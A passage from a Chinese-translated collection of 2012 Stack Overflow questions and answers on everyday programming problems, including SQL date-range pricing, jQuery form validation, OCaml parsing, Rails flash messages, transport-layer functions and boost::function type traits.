例如，如果客人想在 2012 年 5 月 24 日至 2012 年 5 月 26 日期间入住，则价格应为

第一天 = 95 美元 第 2 天 = 100 美元

5-26-2012 将不收费，因为它是结帐日期。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:23:26.877

如果您每天查询一次，则只有一个默认值，并且价格没有重叠时段：

```
SELECT price FROM tbl_prices
WHERE ($input_date >= date_from AND $input_date <= date_to) 
      OR is_default = 1
ORDER BY is_default
LIMIT 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:21:36.493

一个非常直接的解决方案可以是：

`$from = 5-24-2012`和`$till = 5-26-2012`

```
select price, date_to from my_table where date_from <= $from 
ORDER BY date_from ASC LIMIT 1 
```

然后可能您可以在 date_to （由此查询接收）和 $till 之间进行检查。

```
if($till <= $date_to) {
    // total cost is price * no. of days of stay
}
else {
   // repeat above query, this time with date_to parameter in where clause
   // total cost is price1 * no. of days in 1st range + .....
} 
```

# php - 想要我的 textarea 格式它是像 html 这样的只读文本

> ID：10220286
> 
> 赞同：0
> 
> 时间：2012-04-19T01:06:38.880
> 
> 标签：php, javascript, html, css, textarea

我有一个只读的文本区域，我显示它作为我的旧博客文章（可在其下方的字段中编辑），我希望能够对其内容进行一些格式化。理想情况下，我希望它看起来像 HTML 代码，但至少，我希望在输入 URL 时，将其显示为 href 链接。

有没有这方面的最佳实践？还是我必须处理每个并查找和格式化我想要的项目？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T03:22:08.787

使用带有`white-space: pre`CSS 属性的简单 div（或段落元素，或其他）来显示换行符。

```
#div-mimicking-textarea { white-space: pre; } 
```

文本区域内不可能有锚元素。

# c# - Lua 脚本和 C#

> ID：10220287
> 
> 赞同：0
> 
> 时间：2012-04-19T01:06:54.567
> 
> 标签：c#, c++, dll, scripting, lua

这对我来说很棘手，我希望有人能帮助我。

情况：我目前正在使用 C# 3.5 .NET 开发一个应用程序，它与使用 DLL Imports 用 C++ 编写的 DLL 接口，一切正常。我也有一个Lua脚本，这个脚本如下：

```
Width           = XCamera():GetWidth()
Height          = XCamera():GetHeight()
Img             = XSensorImage() 
```

那么例如，有一个函数可以通过以下方式从 Img 计算温度：

```
function OnFrame()
     local CoordsTable = { i, j }
     local PixelTable = Img:GetPixels( CoordsTable )
     PixelValue = FromLinearizedADU( PixelTable[1] or 0 )
end 
```

我想要做的是将 PixelValue 返回到我的应用程序。

XCamera() 和 XSensorImage() 是在初始化相机滤镜并且 Lua 脚本处于活动状态时创建的实例。

运行时是否可以从该脚本访问像素值？很抱歉，如果我不够详细，请询问您是否需要更多，非常感谢您的反馈。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:57:52.500

托管 Lua 运行时的 C++ DLL，而不是您的 C# 应用程序？那么，不，可能没有简单的方法可以做到这一点。如果 DLL 使用共享的 Lua DLL 并且没有锁定扩展，您可能会加载一个库，该库使用某种形式的进程间通信来与 C# 应用程序进行通信。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:13:06.290

您可以从函数返回 PixelValue。

```
return PixelValue; 
```

# javascript - JavaScript 创建函数

> ID：10220288
> 
> 赞同：0
> 
> 时间：2012-04-19T01:06:58.947
> 
> 标签：javascript, html

我如何定义html的以下对象属性并将其定义为一个函数，`javascript`该函数将返回一些对象。

HTML：

```
<object id="desktop" type="application/x-desktop" width="500" height="200">
<param name="client_type" value="VISTA" /> </object> 
```

我想在 javascript 中实现类似下面的内容。这样我就可以从 javascript 之外调用 GetDesktop() 函数。

JavaScript：

```
 function GetDesktop()
  {
    object.id = "desktop;
    object.type = "application/x-desktop"
     ....
     ...
    ...
   } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:21:52.730

您想从 JS 函数返回上面的 HTML 吗？

```
var GetDesktop = function(){
    var obj = document.createElement('object');
    obj.setAttribute('id', 'desktop');
    obj.setAttribute('type', 'application/x-desktop');
    obj.setAttribute('width', '500');
    obj.setAttribute('height', '200');
    var param = document.createElement('param');
    param.setAttribute('name', 'client_type');
    param.setAttribute('value', 'VISTA');
    obj.appendChild(param);

    return obj;
} 
```

显然，如果这些属性中的任何一个需要更改，您可以将它们作为参数传递给函数......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:44:39.457

我对这个问题的解释与@tkone 的相反。希望我们中的一个人是对的。:)

这个浏览器是 Javascript 的吗？如果是这样，那为什么不直接使用 HTMLElement 对象呢？

```
var obj = document.getElementById('desktop'); 
```

这会为您提供一个满足以下条件的对象：

```
obj.getAttribute('id') // -> 'desktop'
obj.getAttribute('type') //-> 'application/x-desktop' 
```

*等等*

如果您想要一个具有直接存储属性的简单 JS 对象，您可以通过循环遍历 DOM 属性来创建一个：

```
 var elem = document.getElementById('desktop');
   var obj = {};
   var attrCount = elem.attributes.length;
   for (var i=0; i<attrCount; ++i) {
      var attr = elem.attributes[i];
      obj[attr.name] = attr.value
   } 
```

这会为您提供一个满足以下条件的对象：

```
obj.id // -> 'desktop'
obj.type //-> 'application/x-desktop' 
```

*等等*。

# parsing - Ocaml 解析字符串生成树

> ID：10220292
> 
> 赞同：7
> 
> 时间：2012-04-19T01:07:39.163
> 
> 标签：parsing, tree, ocaml, grammar

我有一个类似的问题：

[如何在 Ocaml 中快速将树结构打印成字符串？](https://stackoverflow.com/q/4258164/872344)

但以相反的方式，我已经有一个字符串并想将其解析回一棵树。

例如，我有

```
type expr = 
  Number of int
 |Plus of expr*expr
 |Prod of expr*expr 
```

我有一个像 1+2*3+4 这样的字符串（与上面的链接有点不同，假设`*`具有比 更高的过程`+`）
然后我希望我的结果是 expr 类型`Prod(Plus(1,2), Plus(3, 4))`

我找到了另一个可能谈论这个的链接，但不确定这是否是解决我的问题的一种方式：

[使用 OCaml 解析语法](https://stackoverflow.com/questions/1584247/parsing-grammars-using-ocaml)

请分享一些想法，谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:32:34.540

这是一个标准的解析问题：在所有编译器/解释器/等等中都面临着......有很多方法可以解决这个问题，基本上可以归结为以下几点：

*   编写自己的递归下降解析器
*   使用从解析器生成器生成的解析器

听起来你正在做的事情是你需要一个抽象语法树（你在问题中提到的“树”）。您可以轻松地使用 OCaml 解析器生成器来完成这些事情，一个很好的就是[Menhir。](http://cristal.inria.fr/~fpottier/menhir/) 虽然您也可以编写自己的解析器，但使用像 Menhir 或 ocamlyacc 这样的工具来为您完成它是一个非常通用且快速的解决方案（与在简单的递归下降中处理非 LL(1) 事物的讨厌相比）解析器）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-19T06:32:28.440

OCaml 发行版包含`ocamlyacc`一个工具，可以完全满足您的需求（正如 Kristopher 指出的那样，还存在其他工具）。

有关 的一个很好的解释`ocamlyacc`，请参见例如[本教程](http://plus.kaist.ac.kr/~shoh/ocaml/ocamllex-ocamlyacc/ocamlyacc-tutorial/)和[相关示例](http://plus.kaist.ac.kr/~shoh/ocaml/ocamllex-ocamlyacc/ocamlyacc-tutorial/chap-examples.html#sec-reverse-polish-notation-calculator)，其中定义了小型表达式语言（类似于您的）的解析器。

# jquery-validate - 如何使用 jQuery Validation 插件切换所需的字段类？

> ID：10220296
> 
> 赞同：1
> 
> 时间：2012-04-19T01:09:05.057
> 
> 标签：jquery-validate, removeclass, jquery

我的应用程序有一个动态表单，它使用 jQuery 来切换后续问题的显示，并使用 jQuery Validation 插件使某些问题成为必需的。我的问题是，当表单加载时，以前回答的问题，正确的类没有显示。

如果回答“是”，“跟进”问题会显示一个文本区域。如果选择“yes”并显示 textarea，则 textarea 应该是必填字段（class="required"）。如果选择“否”，并且 textarea 被隐藏，则不需要 textarea。

如果您查看一个工作示例[http://jsfiddle.net/GKATm/](http://jsfiddle.net/GKATm/)并查看源代码或使用 Firebug，则根据需要设置隐藏的文本区域：

```
<span class="details" style="display: none;">
     <textarea id="followup_1_details" maxlength="1000" class="required"></textarea>
</span> 
```

关于我做错了什么的任何想法。当表单加载为空白时，一切正常。但是我的应用程序允许用户返回他们保存的答案，当他们这样做时，验证插件会将其标记为无效，因为未回答必填字段。

请帮忙！

HTML：

```
<div>    
    <label>Question #1</label>
    <span class="options">
        No  <input type="radio" class="toggle_group required" value="0" id="restrictions_no" name="restrictions">
        Yes <input type="radio" class="toggle_group required" value="1" id="restrictions_yes" name="restrictions" checked="checked">
    </span>
</div>

<div class="details_group">
    <div>
        <label>Follow Up #1</label>
        <span>
            No  <input type="radio" class="toggle" value="0" id="followup_1_no" name="followup_1" checked="checked">
            Yes <input type="radio" class="toggle" value="1" id="followup_1_yes" name="followup_1">
        </span>            
        <span class="details">
            <textarea maxlength="1000" id="followup_1_details"></textarea>
        </span>
    </div>

    <div>
        <label>Follow Up #2</label>
        <span>
            No  <input type="radio" class="toggle" value="0" id="followup_2_no" name="followup_2">
            Yes <input type="radio" class="toggle" value="1" id="followup_2_yes" name="followup_2" checked="checked">
        </span>            
        <span class="details">
            <textarea maxlength="1000" id="followup_2_details"></textarea>
        </span>
    </div>
</div> 
```

Javascript：

```
$('.toggle').on('change', function() {

    var showOrHide = false;

    $(this).siblings('input[type=radio]').andSelf().each(function() {
        if ($(this).val() == 1 && $(this).prop("checked")) showOrHide = true;
    })

    $(this).parent().next('.details').toggle(showOrHide);
    $(this).parent().next('.details').find('textarea').addClass('required');

    if (showOrHide == false) {
        $(this).parent().next('.details').find('textarea').val('');
        $(this).parent().next('.details').find('textarea').removeClass('required');
    }

}).change()

$('.toggle_group').on('change', function() {

    var showOrHide = false;

    $(this).siblings('input[type=radio]').andSelf().each(function() {
        if ($(this).val() == 1 && $(this).prop("checked")) showOrHide = true;
    })

    $(this).parent().parent().next('.details_group').toggle(showOrHide)
    $(this).parent().parent().next('.details_group').find('input:radio').addClass('required');
    $(this).parent().parent().next('.details_group').find('textarea').addClass('required');

    if (showOrHide == false) {
        $(this).parent().parent().next('.details_group').find('input:radio').removeAttr('checked')
        $(this).parent().parent().next('.details_group').find('input:radio').removeClass('required');
        $(this).parent().parent().next('.details_group').find('textarea').val('');
        $(this).parent().parent().next('.details_group').find('textarea').removeClass('required');

    }

}).change() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T11:33:49.563

刚刚想通了。我将每个切换都放入了函数中，并在组切换中调用了后续切换。

示例：http: [//jsfiddle.net/GKATm/1/](http://jsfiddle.net/GKATm/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:39:33.473

```
$(function() {
  //Remove requirement for prepopulated textareas
  $("textarea:text[value!='']").removeClass('required');

  //Catch for clicking the radio
  $('input[type=radio]').on('click', function() {
    var $this = $(this);
    if ($this.val() == 1) {
      $this.parent().siblings('.details').children('textarea').addClass('required');
    } else {
      $this.parent().siblings('.details').children('textarea').removeClass('required');
    }
  })
}); 
```

小提琴：http: [//jsfiddle.net/HS35e/](http://jsfiddle.net/HS35e/)

# jquery - 有没有比这更快的方法来一次插入所有图片

> ID：10220303
> 
> 赞同：1
> 
> 时间：2012-04-19T01:10:51.483
> 
> 标签：jquery, html

我有一个照片库，图像的名称从 0 到 170，我像这样插入它们：

```
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js"></script>

        <!-- load Galleria -->
        <script src="galleria-1.2.7.min.js"></script>

    </head>
<body>
    <div class="content">
        <h1>Galleria Classic Theme</h1>
        <p>Demonstrating a basic gallery example.</p>

        <!-- Adding gallery images. We use resized thumbnails here for better performance, but it’s not necessary -->

        <div id="galleria">
            <a href="images/0.jpg">
                <img src="images/0.jpg">
            </a>
           <a href="images/1.JPG">
                <img src="images/1.JPG">
            </a>
            <a href="images/2.JPG">
                <img src="images/2.JPG">
            </a>
           <a href="images/3.JPG">
                <img src="images/3.JPG">
            </a>
          <a href="images/4.JPG">
                <img src="images/4.JPG">
            </a>
           <a href="images/5.JPG">
                <img src="images/5.JPG">
            </a>
                  </div>

        <p class="cred">Made by <a href="http://galleria.aino.se">Galleria</a>.</p>
    </div>

    <script> 
```

我可以使用不需要输入每张照片名称的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T01:17:03.720

您应该在服务器上执行此操作，而不是在 JavaScript 中的客户端上。

但是，要回答您的问题，

```
 var escape_amount = 170, resHtml = '', ii;
   for (ii = 0; ii < escape_amount; ii++)
   {
      resHtml += '<a href="images/'+ii+'.jpg"><img src="images/'+ii+'"></a>';
   }
   $('#galleria').html(resHtml); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T01:18:03.997

有两种方法可以动态生成此类图像列表

1.  在服务器端，如果您可以动态生成 HTML，则可以使用您正在使用的任何服务器端语言/模板语言进行操作

2.  在客户端，您可以动态插入图像节点，幸运的是 JavaScript 有一个 for 循环

例如

```
var galleria = $('#galleria')
for(var i=0;i<170;i++){
    var imgName = "images/"+i+".JPG"
    galleria.append('<a href="'+imgName+'"><img src="'+imgName+'"></a>')
} 
```

客户端的好处是，在某些情况下，您可能会很懒惰，直到需要时才插入任何图像或插入所需的任何数量，从而加快页面加载时间。

# ruby-on-rails - flash.now 是否可以在 Ruby on Rails 3+ 中使用？

> ID：10220307
> 
> 赞同：0
> 
> 时间：2012-04-19T01:11:11.957
> 
> 标签：ruby-on-rails

目前我在 Rails 3.0.3 上，我正在尝试在我的用户控制器中呈现一个“新”动作，并带有一个 flash 通知我在新用户页面上获得了初始 flash，但是当我去的时候也得到了 flash 消息的重复到另一个页面。
根据我所做的研究，您`flash.now[:notice]`用于渲染，但它不起作用。显示后不清除闪光灯。

这是我的代码：users_controller.rb

```
def create
  flash.now[:notice] = "flash test."
  render :new
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T03:51:44.513

它应该可以工作，现在已经存在了很长时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T07:33:21.943

不知道它是否能解决你的问题，但你试过了吗

```
flash.discard 
```

考虑这个[railscast](http://railscasts.com/episodes/43-ajax-with-rjs)

# network-programming - 传输层的功能是什么？

> ID：10220309
> 
> 赞同：2
> 
> 时间：2012-04-19T01:11:45.460
> 
> 标签：network-programming, transport, osi

我有一个作业问题，询问传输层的四个功能是什么。不是说 TCP 或 UDP 的功能是什么，而是层本身。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-18T08:48:55.497

传输层提供的一些功能包括：

*   应用识别
*   客户端实体识别
*   确认整个消息完好无损
*   用于网络传输的数据分段
*   控制数据流以防止内存溢出
*   两端虚电路的建立与维护
*   传输错误检测
*   在接收端以正确的顺序重新排列分段数据
*   在单个物理链路上多路复用或共享多个会话

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:15:31.110

*   面向连接的通信
*   字节方向
*   可靠性
*   流量控制
*   拥塞避免

来源：[http ://en.wikipedia.org/wiki/Transport_layer](http://en.wikipedia.org/wiki/Transport_layer)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-10-22T16:56:50.560

传输层是 TCP/IP 模型中的第四层，处理进程之间的逻辑通信。

传输层的几个功能如下：

1.  网络层提供数据的分割。
2.  它确保了流程到流程的交付。
3.  它提供流量控制和错误控制
4.  它不仅可以使用较少的连接，还可以使用面向连接的传输。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T01:15:37.600

传输层主要负责主机和客户端之间可靠的进程-进程通信。在这里查看更多信息： [http ://en.wikipedia.org/wiki/Transport_layer](http://en.wikipedia.org/wiki/Transport_layer)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-14T11:01:54.560

1.  分割
2.  连接管理
3.  流量控制
4.  确认处理
5.  错误检测和纠正

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-25T10:09:11.343

**传输层协议的主要职责是：**

*   跟踪源主机和目标主机上的应用程序之间的单独通信。在源应用程序和目标应用程序之间流动的每组特定数据称为会话。一个主机可能有多个应用程序同时通过网络进行通信。这些应用程序中的每一个都与一个或多个远程主机上的一个或多个应用程序进行通信。维护和跟踪这些多个会话是传输层的责任。
*   对数据进行分段以便于管理，并将分段数据重新组合成目的地的应用程序数据流。数据必须准备好以可管理的片段通过媒体发送。大多数网络对可以包含在单个数据包中的数据量都有限制。传输层协议具有将应用程序数据分割成适当大小的数据块的服务。该服务包括对每条数据所需的封装。用于重组的标题被添加到每个数据块中。此标头用于跟踪数据流。在目的地，传输层必须能够将数据片段重构为对应用层有用的完整数据流。
*   为每个通信流识别适当的应用程序（端口）。网络中的每台主机上可能运行着许多应用程序或服务。要将数据流传递给适当的应用程序，传输层必须识别目标应用程序。为此，传输层为每个应用程序分配一个标识符。该标识符称为端口号。每个需要访问网络的软件进程都被分配了一个在该主机中唯一的端口号。传输层使用端口来识别应用程序或服务。

**传输层的任何附加属性都来自所使用的协议，最常见的是 TCP 或 UDP。**

# asp.net-mvc - Windows Azure 缓存 cshtml 文件？

> ID：10220313
> 
> 赞同：0
> 
> 时间：2012-04-19T01:12:24.277
> 
> 标签：asp.net-mvc, azure

我正在为我正在开发的 MVC 应用程序评估 Windows Azure。我不久前移植了该应用程序并上传没有任何问题。大约 4 周后我回来上传下一个版本，现在我遇到了一个异常。

来源：System.Web.WebPages 消息：未定义部分：“main”。堆栈跟踪：在 System.Web.WebPages.WebPageBase.RenderSection(String name, Boolean required) at ASP._Page_Views_Shared__Layout_cshtml.Execute() in e:\sitesroot\0\Views\Shared_Layout.cshtml:line 77 at System.Web.WebPages .WebPageBase.ExecutePageHierarchy() 在 System.Web.Mvc.WebViewPage.ExecutePageHierarchy() 在 System.Web.WebPages.WebPageBase.ExecutePageHierarchy(WebPageContext pageContext, TextWriter writer, WebPageRenderingBase startPage) 在 System.Web.WebPages.WebPageBase.RenderSurrounding(String partialViewName, Action`1 body) at System.Web.WebPages.WebPageBase.PopContext() at System.Web.Mvc.ViewResultBase.ExecuteResult(ControllerContext context) at System.Web.Mvc.Async.AsyncControllerActionInvoker.<>c_ *DisplayClass25.b*System.Web.Mvc.Controller 处的_22(IAsyncResult asyncResult)。<>c_DisplayClass1d.b System.Web.Mvc.Async.AsyncResultWrapper 处的_18(IAsyncResult asyncResult)。<>c_DisplayClass4.b _3 *(* *IAsyncResult* ar) 系统处。 Web.Mvc.Controller.EndExecuteCore(IAsyncResult asyncResult) 在 System.Web.Mvc.Async.AsyncResultWrapper.<>c_ *DisplayClass4.b* _3(IAsyncResult ar) 在 System.Web.Mvc.MvcHandler.<>c_ *DisplayClass6.<>c* _DisplayClassb.b_ *4(IAsyncResult asyncResult) 在 System.Web.Mvc.Async.AsyncResultWrapper.<>c*_DisplayClass4.b__3(IAsyncResult ar) 在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() 在 System.Web.HttpApplication.ExecuteStep(IExecutionStep 步骤，布尔和完成同步)

我认为会发生这种情况的唯一原因是 _layout.cshtml 文件未更新或 Home/Index.cshtml 文件未更新。MVC 应用程序在 Windows Azure 模拟器中运行或在 IIS 中独立运行时都能正常工作。

我已完全删除角色并重新部署和升级。我没有配置 CDN 或 Azure 缓存，我可以确认自上次成功部署以来添加到项目中的文件可用。

现在我没有想法...

编辑：

我已将问题缩小到在子布局中调用 Html.RenderAction。我想知道这是否是我正在测试的 MVC 4 项目的问题。我已经加载了最新的 System.Web.Mvc dll 作为我项目的一部分，但是 Azure 服务器上是否存在问题？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T07:19:56.207

我想知道您在_layout.cshtml 中是否有@RenderSection("main")。如果有，请确保使用 _layout.cshml 的每个页面都有一个名为 main 的部分，而不仅仅是 Index.aspx。正如您所提到的，该项目在本地运行良好，我建议您确保将最新版本部署到云中。也请尝试重建解决方案，删除发布包，重新打包，看看是否有帮助。

此致，

明旭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T14:00:49.060

问题已解决。问题是通过 RenderAction 返回的部分视图失败。这是因为部分视图包含一个由数据库调用填充的选择列表，并且与数据库的连接失败。Azure 上的数据库是 SQL Azure 数据库，但在本地它只是一个 SQL 2008 R2 数据库。我以为我已经测试了与 SQL Azure 的数据库连接，但显然没有。

谢谢你的时间，明。

# php - 将 userId 从设置默认值传递给当前用户

> ID：10220315
> 
> 赞同：0
> 
> 时间：2012-04-19T01:12:34.697
> 
> 标签：php, symfony-1.4, sfguard

一个快速的问题。我将 symfony1.4 与 Doctrine ORM 和 sfGuardDoctrinePlugin 一起使用。我有一个名为“任务”的 symfony 表单。我希望将 userId 字段（如果用户表 FK 到 Id 字段）默认设置为当前登录的用户。我怎样才能做到这一点？

```
//apps/myapp/modules/task/actions

class taskActions extends sfActions
{
  public function executeNew(sfWebRequest $request)
  {
    $this->form = new taskForm();
  }

  public function executeCreate(sfWebRequest $request)
   {
    $this->forward404Unless($request->isMethod(sfRequest::POST));

    $this->form = new taskForm();

    $this->processForm($request, $this->form);

    $this->setTemplate('new');
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:24:00.050

在没有看到您如何通过操作或通过设置表单的情况下回答有点棘手`$form->configure()`，但您可以使用以下方法访问当前用户 ID：

```
$currentUserId = sfContext::getInstance()->getUser()->getGuardUser()->getId(); 
```

- 更新 -

根据您的更新，它似乎`taskForm`不是基于模型对象，否则您将通过构造函数传递对象，因此它必须是自定义表单。有几种方法可以给这只猫换肤，您可以通过构造函数传递用户对象，也可以通过公共访问器设置值，如下所示：

```
class taskForm
{
    protected $user;

    public function setUser($user)
    {
        $this->user = $user;
    }

    public function getUser()
    {
        return $this->user;
    }

    public function configure()
    {
        // This should output the current user id which demonstrates that you now
        // have access to user attributes in your form class
        var_dump($this->getUser()->getGuardUser()->getId()); 
    }
} 
```

并设置它：

```
public function executeNew(sfWebRequest $request)
{
    $this->form = new taskForm();

    $this->form->setUser($this->getUser());
} 
```

您可能能够做到的另一种方法是将用户对象直接传递给构造函数，然后您可以`$this->getObject()->getUser()`在表单中使用它来引用它，尽管我不推荐这样做，因为它会在用户上下文中强制执行 taskForm。

# c++ - 使用 std::is_assignable、boost::function 和 nullptr 时的意外结果

> ID：10220316
> 
> 赞同：12
> 
> 时间：2012-04-19T01:12:51.910
> 
> 标签：c++, boost, c++11

当使用 gcc 4.7 和 boost 1.49 时，使用`is_assignable`返回的以下表达式：`true`

```
typedef boost::function<void()> F;
std::is_assignable<F, std::nullptr_t>::value 
```

但是，此代码无法编译：

```
boost::function<void()> f;
f = nullptr; 
```

产生这些错误消息：

```
In file included from c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/detail/maybe_include.hpp:13:0,
             from c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/detail/function_iterate.hpp:14,
             from c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/preprocessor/iteration/detail/iter/forward1.hpp:47,
             from c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function.hpp:64,
             from ..\main.cpp:8:
c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/function_template.hpp: In instantiation of 'static void boost::detail::function::void_function_obj_invoker0<FunctionObj, R>::invoke(boost::detail::function::function_buffer&) [with FunctionObj = std::nullptr_t; R = void]':
c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/function_template.hpp:907:60:   required from 'void boost::function0<R>::assign_to(Functor) [with Functor = std::nullptr_t; R = void]'
c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/function_template.hpp:722:7:   required from 'boost::function0<R>::function0(Functor, typename boost::enable_if_c<boost::type_traits::ice_not<boost::is_integral<Functor>::value>::value, int>::type) [with Functor = std::nullptr_t; R = void; typename boost::enable_if_c<boost::type_traits::ice_not<boost::is_integral<Functor>::value>::value, int>::type = int]'
c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/function_template.hpp:1042:16:   required from 'boost::function<R()>::function(Functor, typename boost::enable_if_c<boost::type_traits::ice_not<boost::is_integral<Functor>::value>::value, int>::type) [with Functor = std::nullptr_t; R = void; typename boost::enable_if_c<boost::type_traits::ice_not<boost::is_integral<Functor>::value>::value, int>::type = int]'
c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/function_template.hpp:1083:5:   required from 'typename boost::enable_if_c<boost::type_traits::ice_not<boost::is_integral<Functor>::value>::value, boost::function<R()>&>::type boost::function<R()>::operator=(Functor) [with Functor = std::nullptr_t; R = void; typename boost::enable_if_c<boost::type_traits::ice_not<boost::is_integral<Functor>::value>::value, boost::function<R()>&>::type = boost::function<void()>&]'
..\main.cpp:172:6:   required from here
c:\mingw\bin\../lib/gcc/i686-pc-mingw32/4.7.0/../../../../include/boost/function/function_template.hpp:153:11: error: '* f' cannot be used as a function 
```

此外，此表达式返回`false`：

```
typedef boost::function<void()> G;
std::is_assignable<G, decltype(NULL)>::value 
```

但这段代码确实编译：

```
boost::function<void()> g;
g = NULL; 
```

的结果`is_assignable`似乎没有正确反映`boost::function`. 我在这里做错了吗？（我无法理解错误消息。）

我认为类型特征应该是确定模板中使用的类的功能的可靠方法。C++11 中提供的类型特征是否与 boost::function 完全不兼容？

* * *

为了提供一些背景信息，我一直在从事几个个人项目，以更好地熟悉 C++11 的新特性。对于这个特定的项目，我正在尝试创建一个类来存储可以“停用”的可调用函数。这大致是我想要做的：

```
template <typename F>
class callable_function
{
public:
    callable_function(F func) : func_(func)
    {
        /* func_ is initially active */
    }

    void call()
    {
        if (/* func_ is active */) func_();
    }

    void deactivate()
    {
        /* set func_ to deactive */
    }

private:
    F func_;
}; 
```

对于`/* func_ is active */`and`/* set func_ to deactive */`块，我想提供两种不同的实现，在编译时根据`F`. 如果`nullptr`可以分配给`func_`并且`func_`可以在布尔上下文中使用，那么我想使用以下内容（这是为内置函数指针和选择的内容`std::function`）：

```
template <typename F>
class callable_function
{
public:
    callable_function(F func) : func_(func) {}

    void call()
    {
        if (func_) func_();
    }

    void deactivate()
    {
        func_ = nullptr;
    }

private:
    F func_;
}; 
```

如果`nullptr`不能分配给`func_`，那么我想在存储“活动”状态的类中存储一个额外的布尔值。为仿函数和 lambda 函数选择此实现：

```
template <typename F>
class callable_function
{
public:
    callable_function(F func) : func_(func), active_(true) {}

    void call()
    {
        if (active_) func_();
    }

    void deactivate()
    {
        active_ = false;
    }

private:
    F func_;
    bool active_;
}; 
```

由于`nullptr`目前无法分配给`boost::function`，我希望选择第二个实现。但是，由于`is_assignable`is 返回`true`for`boost::function`和`nullptr`，因此选择了第一个实现，这会导致`deactivate`函数中出现编译错误。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-23T20:41:27.190

[我对回答自己的问题感到难过，但由于我已经学到了很多关于它的知识，我认为最好在这里整合这些信息。杰西在帮助我理解所有这些方面发挥了巨大作用，所以请在上面对他的评论进行投票。]

那么，为什么会`is_assignable`返回以下结果：

```
typedef boost::function<void()> F;
std::is_assignable<F, std::nullptr_t>::value // true
std::is_assignable<F, decltype(NULL)>::value // false 
```

尽管这些陈述似乎与这些结果相矛盾：

```
boost::function<void()> f;
f = nullptr; // fails to compile
f = NULL;    // compiles correctly 
```

首先要注意的是，标准库的任何基于操作的类型特征（`is_constructible`、`is_assignable`、`is_convertible`等）仅检查具有与给定模板的类型匹配的有效接口的函数。特别是，当这些类型被替换到函数体中时，它们不会检查该函数的实现是否有效。

`boost::function`没有特定的构造函数`nullptr`，但它确实有一个“包罗万象”的模板赋值运算符（以及相应的构造函数）：

```
template<typename Functor>
BOOST_FUNCTION_FUNCTION& operator=(Functor const & f); 
```

这是 的最佳匹配`nullptr`，因为没有特定的重载 for`std::nullptr_t`并且不需要任何转换为​​另一种类型（除了转换为 a `const &`）。因为模板替换找到了这个赋值运算符，所以`std::is_assignable<boost::function<void()>, std::nullptr_t>`返回`true`.

但是，在这个函数的主体内，`Functor`应该是一个可调用的类型；也就是说，`f();`预计是一个有效的陈述。 `nullptr`不是可调用对象，因此，以下代码会导致问题中列出的编译器错误：

```
boost::function<void()> f;
f = nullptr; // fails to compile 
```

但是为什么会`std::is_assignable<boost::function<void()>, decltype(NULL)>`返回`false`？ `boost::function`参数没有特定的赋值运算符`int`，那么为什么不使用相同的“包罗万象”模板赋值运算符`int`and `std::nullptr_t`？

之前我通过省略元编程方面简化了这个赋值运算符的代码，但由于它们现在是相关的，我将它们添加回来：

```
template<typename Functor>
typename enable_if_c<
           (boost::type_traits::ice_not<
             (is_integral<Functor>::value)>::value),
           BOOST_FUNCTION_FUNCTION&>::type
operator=(Functor const & f) 
```

不言而喻，`enable_if_c`这里使用元编程构造是为了防止在参数类型为时`int`（即`is_integral`返回时`true`）实例化此赋值运算符。因此，当赋值语句的右侧是类型`int`时，没有匹配的赋值运算符`boost::function`。这就是为什么`std::is_assignable<boost::function<void()>, decltype(NULL)>`返回`false`，因为`NULL`它是类型`int`（至少对于 GCC）。

但这仍然不能解释为什么`f = NULL;`编译正确。为了解释这一点，重要的是要注意该值`0`可以隐式转换为任何指针类型。 `boost::function`通过使用接受指向私有结构的指针的赋值运算符来利用这一点。（以下是代码的一个大大简化的版本`boost::function`，但足以证明我的观点）：

```
namespace boost
{
    template<typename R()>
    function
    {
    private:
        struct clear_type {}
        //...

    public:
        BOOST_FUNCTION_FUNCTION& operator=(clear_type*);
        //...
    };
} 
```

由于`clear_type`是私有结构，因此任何外部代码都无法创建它的实例。此赋值运算符可以接受的唯一值是一个从 隐式转换的空指针`0`。这是使用表达式调用的赋值运算符`f = NULL;`。

